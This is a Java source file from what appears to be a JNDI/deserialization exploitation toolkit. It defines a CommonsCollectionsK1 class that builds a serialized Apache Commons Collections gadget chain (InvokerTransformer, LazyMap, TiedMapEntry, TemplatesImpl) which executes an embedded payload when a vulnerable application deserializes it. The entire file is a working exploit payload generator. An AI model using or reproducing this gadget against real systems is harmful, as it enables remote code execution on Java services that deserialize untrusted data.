package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsK1 implements ObjectPayload<Object>{

    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(type, param);

        InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        HashMap<String, String> innerMap    = new HashMap<String, String>();
        Map                     m           = LazyMap.decorate(innerMap, transformer);
        Map                     outerMap    = new HashMap();
        TiedMapEntry            tied        = new TiedMapEntry(m, tpl);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(outerMap);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public Object getObject(String command) throws Exception {
        return null;
    }
}
